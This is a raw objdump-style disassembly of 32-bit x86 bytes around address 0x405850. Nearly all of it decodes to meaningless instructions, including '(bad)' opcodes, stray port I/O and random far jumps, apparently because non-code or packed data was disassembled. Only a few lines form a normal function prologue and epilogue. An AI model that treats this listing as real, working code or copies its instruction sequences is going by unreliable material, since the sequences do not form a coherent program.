  405850:	fistp  QWORD PTR [esi]
  405852:	inc    eax
  405853:	jnp    0x40585e
  405855:	dec    edi
  405856:	pop    eax
  405857:	rsqrtps xmm5,XMMWORD PTR [ecx]
  40585a:	popa   
  40585b:	in     al,dx
  40585c:	das    
  40585d:	pushf  
  40585e:	fcmovb st,st(3)
  405860:	and    BYTE PTR [esi],al
  405862:	adc    eax,0x4646ac8c
  405867:	jmp    eax
  405869:	push   es
  40586a:	pop    edx
  40586b:	mov    bh,BYTE PTR [ecx+0x2a3aa691]
  405871:	lahf   
  405872:	sbb    DWORD PTR [edi+eax*1-0x16ed44b5],esp
  405879:	adc    edx,esi
  40587b:	xor    BYTE PTR [eax+0x7aac009d],0x1f
  405882:	xor    dh,ch
  405884:	imul   ebp,DWORD PTR [esp+edx*8-0x52be9e4a],0xf90281aa
  40588f:	mov    ebx,0x318cad3d
  405894:	sbb    dh,BYTE PTR [edi]
  405896:	sahf   
  405897:	fwait
  405898:	(bad)  
  405899:	mov    esp,0xd30d8720
  40589e:	pop    ebp
  40589f:	inc    eax
  4058a0:	xor    al,0x33
  4058a3:	jb     0x405893
  4058a5:	or     DWORD PTR [eax],eax
  4058a7:	pop    edi
  4058a8:	mov    cl,0x5
  4058aa:	and    dh,dh
  4058ac:	xchg   DWORD PTR [eax+0x71e5c41],eax
  4058b2:	sbb    eax,0xb32eed55
  4058b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058b8:	mov    edi,0x6c8400b3
  4058bd:	(bad)  
  4058be:	in     al,0xe8
  4058c0:	sub    al,0xc
  4058c2:	or     ah,dl
  4058c4:	mov    ebx,0xbe5ba45e
  4058c9:	in     eax,0xcb
  4058cb:	mov    esi,0x321da0b7
  4058d0:	inc    ebx
  4058d1:	in     eax,0xa
  4058d3:	mov    ecx,0x19c5834f
  4058d8:	fadd   DWORD PTR ds:0x4800bf2c
  4058de:	dec    esi
  4058df:	sub    ebp,DWORD PTR [ebx+0x47]
  4058e2:	adc    BYTE PTR [eax-0x237c28e1],0x98
  4058e9:	add    al,0xce
  4058eb:	add    eax,0x2317dbc2
  4058f0:	and    eax,0xde498551
  4058f5:	mov    al,BYTE PTR [esi-0x7e0bf785]
  4058fb:	adc    DWORD PTR [esi+0x5c],eax
  4058fe:	iret   
  4058ff:	adc    al,ch
  405901:	sub    DWORD PTR [ebp+0x7d],esi
  405904:	mov    bl,0x49
  405906:	xchg   ch,bh
  405908:	icebp  
  405909:	mov    edi,0x28f5abe0
  40590e:	or     eax,0xdb2694bd
  405913:	(bad)  
  405914:	sub    esi,DWORD PTR ds:0xf22b8ff2
  40591a:	push   edi
  40591b:	ror    ecx,cl
  40591d:	imul   esi,DWORD PTR [eax-0x2cdf97e4],0x5b
  405924:	pop    ds
  405925:	push   ebx
  405926:	jp     0x4058d0
  405928:	pop    esi
  405929:	ds pop esi
  40592b:	stos   BYTE PTR es:[edi],al
  40592c:	inc    ebx
  40592d:	cmp    eax,DWORD PTR [esp+ebp*8]
  405930:	inc    si
  405932:	push   es
  405933:	mov    ebx,0x91f69b30
  405938:	loopne 0x405938
  40593a:	addr16 mov ecx,0x4728e329
  405940:	scas   al,BYTE PTR es:[edi]
  405941:	loope  0x405929
  405943:	jmp    0x1495d3d3
  405948:	inc    ebp
  405949:	arpl   WORD PTR [edx-0x72],bx
  40594c:	xchg   DWORD PTR ds:0xbefa6af2,ebx
  405952:	cmp    eax,0x9cb44bef
  405957:	loop   0x405931
  405959:	aaa    
  40595a:	push   ebx
  40595b:	and    BYTE PTR [eax-0x34],0x7a
  40595f:	in     al,0x6
  405961:	nop
  405962:	gs pop ebx
  405964:	add    ah,BYTE PTR [esi]
  405966:	arpl   WORD PTR [edi-0x52],cx
  405969:	xchg   esp,eax
  40596a:	xor    bl,ch
  40596c:	mov    ebp,0x8f1ad857
  405971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405972:	dec    esi
  405973:	push   eax
  405974:	(bad)  
  405975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405976:	(bad)  
  405977:	test   BYTE PTR [ebp-0x58],ch
  40597a:	and    al,0x60
  40597c:	imul   edx,ecx,0xf9453a09
  405982:	(bad)  
  405983:	dec    eax
  405984:	sub    DWORD PTR [ebx],edx
  405986:	cdq    
  405987:	pop    ss
  405988:	or     ch,BYTE PTR [ebp+0x65]
  40598b:	ret    
  40598c:	lods   al,BYTE PTR ds:[esi]
  40598d:	(bad)  
  40598e:	jl     0x405919
  405990:	inc    edx
  405991:	add    eax,0xba5a6724
  405996:	stos   DWORD PTR es:[edi],eax
  405997:	inc    edi
  405998:	push   ss
  405999:	stos   BYTE PTR es:[edi],al
  40599a:	pop    edx
  40599b:	aaa    
  40599c:	and    BYTE PTR [edi+esi*4+0x181bf893],ch
  4059a3:	idiv   ch
  4059a5:	sbb    eax,0x4bf4b21b
  4059aa:	iret   
  4059ab:	aam    0xef
  4059ad:	mov    WORD PTR [esi],es
  4059af:	stos   DWORD PTR es:[edi],eax
  4059b0:	cmp    cl,bh
  4059b2:	leave  
  4059b3:	icebp  
  4059b4:	xor    esp,DWORD PTR [ebp+0x3adeb546]
  4059ba:	mov    al,0xb9
  4059bc:	or     BYTE PTR [edi-0x62ecb2cd],0x73
  4059c3:	retf   0x1a97
  4059c6:	add    dl,al
  4059c8:	shl    DWORD PTR [edx],cl
  4059ca:	jmp    0xe14422c4
  4059cf:	shr    BYTE PTR [ebx],cl
  4059d1:	adc    al,0x60
  4059d3:	sub    BYTE PTR [ebx+0x19],dl
  4059d6:	xchg   eax,eax
  4059d8:	fmulp  st(1),st
  4059da:	sub    al,0x29
  4059dc:	mov    cl,0x62
  4059de:	sti    
  4059df:	lods   al,BYTE PTR ds:[esi]
  4059e0:	inc    esp
  4059e1:	out    dx,al
  4059e2:	xchg   ecx,eax
  4059e3:	aam    0x4a
  4059e5:	mov    ?,esi
  4059e7:	add    esp,DWORD PTR [ebp-0x34]
  4059ea:	dec    edx
  4059eb:	inc    ecx
  4059ec:	ja     0x405a20
  4059ee:	sbb    DWORD PTR [eax],ebx
  4059f0:	push   ss
  4059f1:	add    esi,DWORD PTR [ebp+0x10]
  4059f4:	cmp    edx,esi
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x4059c9
  405a20:	pop    ebp
  405a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a22:	mov    esi,0x78783867
  405a27:	dec    ebp
  405a28:	jle    0x405aa2
  405a2a:	js     0x4059b8
  405a2c:	xor    DWORD PTR [edi],esp
  405a2e:	sub    DWORD PTR [edx+0x3d],esi
  405a31:	lods   eax,DWORD PTR ds:[si]
  405a33:	cli    
  405a34:	(bad)  
  405a35:	je     0x405a71
  405a37:	imul   esp,DWORD PTR [ebx-0x6843ba74],0xffffffea
  405a3e:	jbe    0x4059e6
  405a40:	adc    DWORD PTR ds:0x8dc1e143,ebx
  405a46:	mov    dh,0x88
  405a48:	mov    ds:0x5faf338f,eax
  405a4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a4e:	and    eax,0x82f2f30b
  405a53:	adc    al,0x8
  405a55:	sub    al,0x13
  405a57:	sbb    al,0xca
  405a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a5a:	dec    ebx
  405a5b:	scas   al,BYTE PTR es:[edi]
  405a5c:	in     al,0x99
  405a5e:	stos   DWORD PTR es:[edi],eax
  405a5f:	(bad)  
  405a60:	js     0x4059f8
  405a62:	rol    DWORD PTR [esi+0x4c],cl
  405a65:	in     al,dx
  405a66:	or     ah,BYTE PTR [edx+0x77]
  405a69:	and    eax,ecx
  405a6b:	mov    esi,0x6377e0fc
  405a70:	fild   DWORD PTR [eax+0x1e389dcc]
  405a76:	div    edi
  405a78:	inc    ebx
  405a79:	fwait
  405a7a:	retf   
  405a7b:	push   eax
  405a7c:	pop    esp
  405a7d:	adc    al,0xdc
  405a7f:	out    dx,al
  405a80:	mov    ah,0x77
  405a82:	fimul  DWORD PTR [ebx+0x4]
  405a85:	mov    bh,0x68
  405a87:	jae    0x405a5e
  405a89:	retf   
  405a8a:	inc    esi
  405a8b:	mov    al,ds:0xe1b8602e
  405a90:	out    0x8f,eax
  405a92:	xchg   esp,eax
  405a93:	xor    al,0xd2
  405a95:	scas   al,BYTE PTR es:[edi]
  405a96:	inc    eax
  405a97:	xor    al,0xc0
  405a99:	inc    BYTE PTR cs:[edi+edx*4+0xde4945a]
  405aa1:	je     0x405ab8
  405aa3:	xor    DWORD PTR [ecx],0xffffff84
  405aa6:	fisttp WORD PTR [edx+0x332fb5e3]
  405aac:	dec    eax
  405aad:	sbb    eax,0x852774b1
  405ab2:	fst    st(6)
  405ab4:	std    
  405ab5:	mov    ebp,0xb385373d
  405aba:	(bad)  
  405abb:	or     al,0xee
  405abd:	iret   
  405abe:	sbb    eax,0x2ffd413f
  405ac3:	test   eax,0x35cd06ae
  405ac9:	mov    dl,0xb9
  405acb:	xchg   ecx,eax
  405acc:	push   ebp
  405acd:	adc    al,0x49
  405acf:	and    ax,0x7e2f
  405ad3:	in     al,0xc3
  405ad5:	inc    esp
  405ad6:	repz mov eax,ds:0xda6c6717
  405adc:	addr16 dec edx
  405ade:	dec    esi
  405adf:	pop    eax
  405ae0:	das    
  405ae1:	mov    ds:0xf4eaac3b,eax
  405ae6:	sbb    BYTE PTR [ebx-0x69],ah
  405ae9:	xchg   eax,esi
  405aeb:	cmp    edi,DWORD PTR [ebx+eax*1+0x58846bd8]
  405af2:	inc    ecx
  405af3:	scas   al,BYTE PTR es:[edi]
  405af4:	jmp    0x405a90
  405af6:	push   edx
  405af7:	mov    ch,0xbb
  405af9:	adc    eax,0x6829730c
  405afe:	xor    DWORD PTR [ebx+0x22],0xffffffbd
  405b02:	push   di
  405b04:	mov    ds:0x53048ad8,al
  405b09:	lods   al,BYTE PTR ds:[esi]
  405b0a:	or     ebp,DWORD PTR [ecx]
  405b0c:	inc    ebx
  405b0d:	aas    
  405b0e:	test   eax,0xba9a8243
  405b13:	mov    dl,BYTE PTR [esi]
  405b15:	fs push ss
  405b17:	paddusb mm5,QWORD PTR [esi]
  405b1a:	dec    BYTE PTR fs:[edx-0x36031e07]
  405b21:	and    ecx,esi
  405b23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b24:	rcl    DWORD PTR [ebx+0x1e],0x7c
  405b28:	jae    0x405aec
  405b2a:	(bad)  
  405b2b:	pushf  
  405b2c:	mov    cl,0xc
  405b2e:	xchg   ecx,eax
  405b2f:	std    
  405b30:	push   ss
  405b31:	aas    
  405b32:	mov    DWORD PTR [ebx],esi
  405b34:	out    0x9e,al
  405b36:	fwait
  405b37:	movsx  ebx,bh
  405b3a:	and    BYTE PTR [esi],cl
  405b3c:	aam    0xf0
  405b3e:	pop    eax
  405b3f:	in     eax,dx
  405b40:	sahf   
  405b41:	mov    bh,0x38
  405b43:	fsubr  DWORD PTR [edx]
  405b45:	ss je  0x405b71
  405b48:	repnz sub ebx,DWORD PTR [ebx-0x27]
  405b4c:	cld    
  405b4d:	jnp    0x405b96
  405b4f:	lock inc eax
  405b51:	pmaxsw mm5,QWORD PTR [ebp-0xdd5e410]
  405b58:	retf   
  405b59:	les    edi,FWORD PTR [ebp-0x5f]
  405b5c:	ja     0x405ae8
  405b5e:	push   0xa
  405b60:	ror    ecx,cl
  405b62:	in     eax,dx
  405b63:	(bad)  
  405b65:	icebp  
  405b66:	sub    eax,0xf170326b
  405b6b:	retf   
  405b6c:	jmp    0x8b9e:0x28e4f848
  405b73:	xchg   ebp,eax
  405b74:	push   eax
  405b75:	adc    eax,0x66dc18ea
  405b7a:	cmp    eax,0x4caf565e
  405b7f:	cmp    al,0x89
  405b81:	sti    
  405b82:	and    DWORD PTR [eax+0x40],edi
  405b85:	pushf  
  405b86:	or     DWORD PTR [ecx-0x754efe28],esi
  405b8c:	(bad)  
  405b8d:	xchg   DWORD PTR [ebp+ebx*2-0x7d993c3d],ebp
  405b94:	mov    edi,cs
  405b96:	test   eax,0xd6e379bd
  405b9b:	enter  0xfb7f,0x96
  405b9f:	mov    edi,0x50d45b00
  405ba4:	loop   0x405b9c
  405ba6:	pop    ebp
  405ba7:	int    0xce
  405ba9:	lods   eax,DWORD PTR ds:[esi]
  405baa:	(bad)  
  405bab:	dec    esi
  405bac:	div    bl
  405bae:	jmp    0x405b41
  405bb0:	xchg   ebx,eax
  405bb1:	push   edi
  405bb2:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bb4:	sub    eax,0xdfbeb97d
  405bb9:	mov    esp,0xf76d3558
  405bbe:	cld    
  405bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bc0:	(bad)  
  405bc1:	fs adc edi,edx
  405bc4:	scas   al,BYTE PTR es:[edi]
  405bc5:	inc    esp
  405bc6:	mov    ecx,0xeb4c116d
  405bcb:	sbb    al,0x63
  405bcd:	retf   
  405bce:	(bad)  [ebp-0x21]
  405bd1:	mov    al,0xf3
  405bd3:	cmp    edx,DWORD PTR [ebx]
  405bd5:	outs   dx,DWORD PTR ds:[esi]
  405bd6:	mov    eax,0x25fe2d4b
  405bdb:	fsub   st,st(0)
  405bdd:	xchg   ebp,eax
  405bde:	xlat   BYTE PTR ds:[ebx]
  405bdf:	fcomp  st(2)
  405be1:	jge    0x405baa
  405be3:	xor    ecx,DWORD PTR [esi-0x1f]
  405be6:	adc    dl,BYTE PTR [esi+eiz*8]
  405be9:	push   eax
  405bea:	inc    edx
  405beb:	stc    
  405bec:	das    
  405bed:	cmp    cl,BYTE PTR [esp+ebp*8+0x278dec03]
  405bf4:	push   ebx
  405bf5:	cmc    
  405bf6:	sbb    ebp,DWORD PTR [esi-0x3afb8949]
  405bfc:	and    ebx,ebx
  405bfe:	or     edi,esi
  405c00:	xor    ecx,DWORD PTR [edx-0x5ae105a]
  405c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c07:	fcomp  QWORD PTR [esi-0x4]
  405c0a:	daa    
  405c0b:	and    al,0x75
  405c0d:	adc    eax,0x85c99ec3
  405c12:	and    DWORD PTR [edx+0x7c3c6e08],eax
  405c18:	and    DWORD PTR ds:0x6e3ca058,esi
  405c1e:	adc    esp,eax
  405c20:	jb     0x405c4b
  405c22:	push   esp
  405c23:	cmc    
  405c24:	sti    
  405c25:	jg     0x405bde
  405c27:	push   edx
  405c28:	sar    cl,1
  405c2a:	stos   DWORD PTR es:[edi],eax
  405c2b:	jb     0x405c61
  405c2d:	or     DWORD PTR [ecx+edi*8-0x4d169ff0],esp
  405c34:	jmp    0x6184db83
  405c39:	sahf   
  405c3a:	sti    
  405c3b:	jp     0x405c80
  405c3d:	inc    eax
  405c3e:	xchg   esi,eax
  405c3f:	xor    al,0xca
  405c41:	xchg   ecx,eax
  405c42:	inc    edi
  405c43:	push   0xfe196e14
  405c48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c49:	(bad)  
  405c4a:	stc    
  405c4b:	cmp    al,0x66
  405c4d:	mov    edx,ebx
  405c4f:	mov    cl,0x4a
  405c51:	in     al,dx
  405c52:	push   esi
  405c53:	add    bl,BYTE PTR [ecx]
  405c55:	mov    ds:0x717f34cc,al
  405c5a:	jge    0x405c75
  405c5c:	mov    edx,0xbac4a59e
  405c61:	pop    ds
  405c62:	jmp    0xabcf:0x59fedef7
  405c69:	lds    edx,FWORD PTR [ecx-0x3fc788de]
  405c6f:	mov    cl,0x2b
  405c71:	xor    DWORD PTR [eax+0x69],edi
  405c74:	dec    ebp
  405c75:	std    
  405c76:	push   cs
  405c77:	scas   al,BYTE PTR es:[edi]
  405c78:	scas   al,BYTE PTR es:[edi]
  405c79:	icebp  
  405c7a:	pop    esp
  405c7b:	mov    dh,0x78
  405c7d:	in     al,dx
  405c7e:	mov    DWORD PTR gs:[ecx],edi
  405c81:	in     al,dx
  405c82:	ds icebp 
  405c84:	or     BYTE PTR [ecx-0x75],dh
  405c87:	xor    DWORD PTR [ecx],eax
  405c89:	mov    cl,0xff
  405c8b:	push   edx
  405c8c:	scas   eax,DWORD PTR es:[edi]
  405c8d:	ins    DWORD PTR es:[edi],dx
  405c8e:	(bad)  
  405c8f:	dec    eax
  405c90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c91:	adc    eax,0x899baded
  405c96:	push   esp
  405c97:	ror    DWORD PTR [edi-0x41bd9473],1
  405c9d:	std    
  405c9e:	in     eax,dx
  405c9f:	lods   eax,DWORD PTR ds:[esi]
  405ca0:	jno    0x405cb8
  405ca2:	in     al,dx
  405ca3:	add    al,0x29
  405ca5:	cmp    al,0x5f
  405ca7:	retf   
  405ca8:	push   0x4541b282
  405cad:	pop    ecx
  405cae:	loop   0x405c42
  405cb0:	ins    DWORD PTR es:[edi],dx
  405cb1:	fstp   DWORD PTR [ebx-0x66487581]
  405cb7:	and    esp,esp
  405cb9:	xor    DWORD PTR [eax+0x44],0x7c
  405cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cbe:	push   cs
  405cbf:	pop    edx
  405cc0:	aad    0x46
  405cc2:	jge    0x405cae
  405cc4:	pop    esi
  405cc5:	lahf   
  405cc6:	push   0xffffffc8
  405cc8:	pop    eax
  405cc9:	nop
  405cca:	dec    edi
  405ccb:	push   eax
  405ccc:	inc    eax
  405ccd:	xchg   BYTE PTR [eax-0x25],al
  405cd0:	loope  0x405c82
  405cd2:	inc    ecx
  405cd3:	mov    ah,0x6d
  405cd5:	(bad)  
  405cd6:	call   FWORD PTR [eax-0x7ebb8311]
  405cdc:	xchg   edx,eax
  405cdd:	hlt    
  405cde:	sti    
  405cdf:	mov    ah,0x8a
  405ce1:	outs   dx,DWORD PTR ds:[esi]
  405ce2:	xchg   ah,ch
  405ce4:	out    0x2b,eax
  405ce6:	jmp    0x405cfc
  405ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce9:	inc    edi
  405cea:	add    DWORD PTR [esi+0x63],edi
  405ced:	iret   
  405cee:	jo     0x405ca1
  405cf0:	inc    edx
  405cf1:	mov    eax,ds:0xa9399aad
  405cf6:	call   0x9a3:0x5de05cae
  405cfd:	mov    BYTE PTR [ebx],dh
  405cff:	shr    cl,cl
  405d01:	jmp    0x405d05
  405d03:	add    BYTE PTR [eax],al
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0xb1e4c09
  405d13:	fdiv   QWORD PTR [ebp+edi*1+0x7e4d7878]
  405d1b:	js     0x405d95
  405d1d:	mov    al,ds:0xfca33153
  405d22:	cmp    al,0xa0
  405d24:	mov    BYTE PTR [ecx+eax*4+0x4849817e],al
  405d2b:	fs inc ecx
  405d2d:	add    ecx,DWORD PTR [ecx-0xc7c9b6c]
  405d33:	mov    al,ds:0x882ec141
  405d38:	and    cl,BYTE PTR [ebx+0x6a]
  405d3b:	pop    esi
  405d3c:	and    ch,bh
  405d3e:	cmp    esp,DWORD PTR [ebx]
  405d40:	add    eax,0x902d9396
  405d45:	cmp    ah,BYTE PTR [edi+ecx*2+0x45f043f5]
  405d4c:	cmc    
  405d4d:	call   0xec7f:0x4ad75079
  405d54:	imul   ecx,DWORD PTR [ebx-0x39],0xba05184a
  405d5b:	stos   BYTE PTR es:[edi],al
  405d5c:	mov    ah,0x56
  405d5e:	sub    bl,BYTE PTR [ebx+0x71]
  405d61:	fwait
  405d62:	mov    cl,BYTE PTR [eax]
  405d64:	inc    esi
  405d65:	in     al,0x78
  405d67:	mov    bh,0x6f
  405d69:	xchg   ebp,eax
  405d6a:	xchg   esi,eax
  405d6b:	fcom   st(4)
  405d6d:	in     al,dx
  405d6e:	aas    
  405d6f:	test   DWORD PTR [esi+0x607ed206],ecx
  405d75:	leave  
  405d76:	sub    ch,0xe5
  405d79:	loopne 0x405d8a
  405d7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d7c:	icebp  
  405d7d:	nop
  405d7e:	retf   
  405d7f:	cmp    eax,ebx
  405d81:	inc    ecx
  405d82:	adc    ax,0x4c3c
  405d86:	stos   BYTE PTR es:[edi],al
  405d87:	add    eax,0xbc4f362d
  405d8c:	sti    
  405d8d:	mov    ss,WORD PTR [ecx]
  405d8f:	add    DWORD PTR [esi+edi*4],ecx
  405d92:	mov    edi,0x6438c2d2
  405d97:	jns    0x405db4
  405d99:	mov    cl,0xc3
  405d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d9c:	imul   eax,eax,0x7f762d83
  405da2:	into   
  405da3:	pop    ss
  405da4:	(bad)  [ebx+0x628da8a9]
  405daa:	xor    edx,DWORD PTR [ebp+edi*8-0x788b7381]
  405db1:	mov    esp,0x2c6b26ec
  405db6:	stos   BYTE PTR es:[edi],al
  405db7:	sub    cl,bl
  405db9:	and    ah,BYTE PTR [esi]
  405dbb:	lods   al,BYTE PTR ds:[esi]
  405dbc:	sub    al,0x22
  405dbe:	ds cdq 
  405dc0:	cli    
  405dc1:	xchg   BYTE PTR [ebp-0x5d],ch
  405dc4:	leave  
  405dc5:	sbb    al,BYTE PTR [edx+0x3c997f39]
  405dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dcc:	cmp    eax,0x4a1395cc
  405dd1:	jmp    0x405d95
  405dd3:	add    ebx,DWORD PTR [edx]
  405dd5:	ret    
  405dd6:	jmp    0x681c2def
  405ddb:	sub    DWORD PTR [ebp-0x41],eax
  405dde:	add    BYTE PTR [eax],bl
  405de0:	mov    bh,0xa6
  405de2:	mov    esi,0x7077817
  405de7:	sar    DWORD PTR [edx+0x76],1
  405dea:	xor    eax,0x646676c5
  405def:	les    ebx,FWORD PTR [edi+0x82db9c0]
  405df5:	xchg   ebp,eax
  405df6:	addr16 inc edi
  405df8:	pop    esi
  405df9:	outs   dx,DWORD PTR ds:[esi]
  405dfa:	sbb    ch,BYTE PTR [esi+eiz*4-0x41b21e57]
  405e01:	jno    0x405e5c
  405e03:	adc    edi,DWORD PTR [esi]
  405e05:	mov    dl,0x76
  405e07:	mov    ds:0xb0df812b,eax
  405e0c:	and    DWORD PTR [ecx+0x3b],ebx
  405e0f:	out    0x12,al
  405e11:	enter  0x727,0x3
  405e15:	push   edx
  405e16:	inc    ebx
  405e17:	cmp    al,BYTE PTR [edx-0x3e]
  405e1a:	adc    al,0x22
  405e1c:	enter  0x5a1c,0xce
  405e20:	mov    al,0x19
  405e22:	pop    esi
  405e23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e24:	fisttp DWORD PTR [eax+0x60138f9d]
  405e2a:	inc    ecx
  405e2b:	les    edi,FWORD PTR [edi+0x4b]
  405e2e:	lea    esp,[eax]
  405e30:	pop    ecx
  405e31:	push   ecx
  405e32:	in     al,0xa1
  405e34:	in     eax,dx
  405e35:	mov    edx,0xa82914cc
  405e3a:	inc    eax
  405e3b:	aas    
  405e3c:	add    al,0xb1
  405e3e:	mov    dl,0xa7
  405e40:	and    al,0xb4
  405e42:	inc    eax
  405e44:	mov    al,0xc2
  405e46:	rol    DWORD PTR [esi+0x3459b033],1
  405e4c:	inc    ecx
  405e4d:	and    al,0xf0
  405e4f:	or     BYTE PTR [esi-0x6],bl
  405e52:	xlat   BYTE PTR ds:[ebx]
  405e53:	stc    
  405e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e55:	loope  0x405ec9
  405e57:	mov    ah,0xc1
  405e59:	call   0x81bc:0xb9ce272e
  405e60:	out    dx,eax
  405e61:	pop    ecx
  405e62:	sub    ecx,DWORD PTR [ebp+0x33813e93]
  405e68:	sbb    BYTE PTR [esi],0x6f
  405e6b:	mov    al,0x98
  405e6d:	mov    dl,0x1d
  405e6f:	push   ss
  405e70:	sub    BYTE PTR [eax+0x48],cl
  405e73:	pop    ds
  405e74:	mov    ebp,0x60fa4a7a
  405e79:	sbb    eax,0x1d3fe7ff
  405e7e:	and    BYTE PTR [edi],dh
  405e80:	dec    edx
  405e81:	test   DWORD PTR [ebx-0x454d3c15],ebx
  405e87:	ins    DWORD PTR es:[edi],dx
  405e88:	mov    DWORD PTR [edx+0x2a],esp
  405e8b:	ins    DWORD PTR es:[edi],dx
  405e8c:	outs   dx,DWORD PTR ds:[esi]
  405e8e:	push   ebp
  405e8f:	imul   esi,DWORD PTR [esi],0x85357dc1
  405e95:	(bad)
  405e99:	mov    ch,0xf6
  405e9b:	icebp  
  405e9c:	add    al,0xb3
  405e9e:	mov    al,0x29
  405ea0:	xchg   ebp,eax
  405ea1:	jno    0x405e84
  405ea3:	pop    ds
  405ea4:	shl    ebp,cl
  405ea6:	mov    edx,0x71d95752
  405eab:	inc    edx
  405eac:	jnp    0x405eac
  405eae:	adc    ch,BYTE PTR [esi]
  405eb0:	into   
  405eb1:	(bad)  
  405eb2:	cmp    eax,0x36285c0c
  405eb7:	add    eax,0x2dbe5faf
  405ebc:	cli    
  405ebd:	pop    es
  405ebe:	jl     0x405eed
  405ec0:	(bad)  [ecx+ecx*8]
  405ec3:	pop    ecx
  405ec4:	push   ds
  405ec5:	je     0x405e54
  405ec7:	mov    ebp,ebp
  405ec9:	in     eax,0x3
  405ecb:	jns    0x405eae
  405ecd:	sub    ah,bl
  405ecf:	pusha  
  405ed0:	daa    
  405ed1:	test   DWORD PTR [edx+0x4d5be524],edx
  405ed7:	push   ebx
  405ed8:	jl     0x405eb0
  405eda:	daa    
  405edb:	mov    WORD PTR [edx-0x15],?
  405ede:	loopne 0x405f22
  405ee0:	mov    ds:0xd71e82ce,al
  405ee5:	or     eax,0xc7385e9
  405eea:	out    dx,eax
  405eeb:	popf   
  405eec:	dec    ebx
  405eed:	shr    DWORD PTR [edx-0x4d6ea151],0xab
  405ef4:	je     0x405f04
  405ef6:	mov    gs,WORD PTR [ecx]
  405ef8:	inc    edx
  405ef9:	icebp  
  405efa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405efb:	dec    esp
  405efc:	sub    edx,edx
  405efe:	repnz xchg ecx,eax
  405f00:	or     cl,bl
  405f02:	mov    bh,0xa8
  405f04:	jecxz  0x405eb9
  405f06:	xor    al,0x0
  405f08:	ret    0xca0
  405f0b:	sbb    ebx,DWORD PTR ds:0x7d3ed466
  405f11:	dec    esp
  405f12:	sub    al,0xaa
  405f14:	iret   
  405f15:	mov    dh,0x7a
  405f17:	shr    BYTE PTR [edx-0x6],cl
  405f1a:	mov    al,es:0x5e9c9b4b
  405f20:	push   0x39
  405f22:	hlt    
  405f23:	repnz pusha 
  405f25:	dec    eax
  405f26:	ss iret 
  405f28:	pushf  
  405f29:	pop    esi
  405f2a:	sbb    eax,DWORD PTR [esi+0x297498c7]
  405f30:	dec    ebp
  405f31:	rcr    cl,cl
  405f33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f34:	cdq    
  405f35:	(bad)  
  405f36:	jnp    0x405f5b
  405f38:	sub    eax,0x7690c56c
  405f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f3e:	or     al,0x8f
  405f40:	jmp    0x2c7d:0x7e1ad195
  405f47:	dec    eax
  405f48:	mov    es,WORD PTR [ecx+0x35ec7660]
  405f4e:	std    
  405f4f:	pop    esp
  405f50:	mov    esi,0x4616372f
  405f55:	test   eax,0xed65ec84
  405f5a:	inc    edx
  405f5b:	ins    DWORD PTR es:[edi],dx
  405f5c:	sub    BYTE PTR [ebx+0x46],ch
  405f5f:	mov    esi,0x90851277
  405f64:	push   ebp
  405f65:	xor    esi,ebx
  405f67:	jb     0x405fc6
  405f69:	push   eax
  405f6a:	imul   dh
  405f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f6d:	add    bh,BYTE PTR [eax]
  405f6f:	xchg   BYTE PTR [ebx],bh
  405f71:	clc    
  405f72:	jmp    0xa22f:0x5109d3ed
  405f79:	inc    esp
  405f7a:	test   eax,0x8f6801df
  405f7f:	cmp    DWORD PTR [ebp-0x2d],esp
  405f82:	out    dx,eax
  405f83:	mov    cl,0x2
  405f85:	cmp    edx,edx
  405f87:	into   
  405f88:	push   esp
  405f89:	mov    esp,0x2ac51432
  405f8e:	popf   
  405f8f:	out    0xe5,eax
  405f91:	adc    ah,ch
  405f93:	add    dh,BYTE PTR [ebx-0x45]
  405f96:	scas   eax,DWORD PTR es:[edi]
  405f97:	test   al,0xb9
  405f99:	fsub   DWORD PTR [ebx+eiz*2-0x64fbb96c]
  405fa0:	or     al,0xae
  405fa2:	sbb    ah,BYTE PTR [ebp+ebp*8-0x639b31ae]
  405fa9:	es addr16 inc eax
  405fac:	and    DWORD PTR [edx+0x7c],0x60
  405fb0:	(bad)  
  405fb1:	inc    eax
  405fb2:	mov    cl,cl
  405fb4:	xor    DWORD PTR [edx+0x7b8657eb],edx
  405fba:	je     0x406037
  405fbc:	xchg   DWORD PTR [edi-0x39902176],edi
  405fc2:	aas    
  405fc3:	and    al,0x75
  405fc5:	ja     0x405fd7
  405fc7:	in     eax,dx
  405fc8:	mov    ds:0x19042b93,al
  405fcd:	pop    ss
  405fce:	test   eax,0xe60b8523
  405fd3:	mov    cl,0x1a
  405fd5:	push   ebp
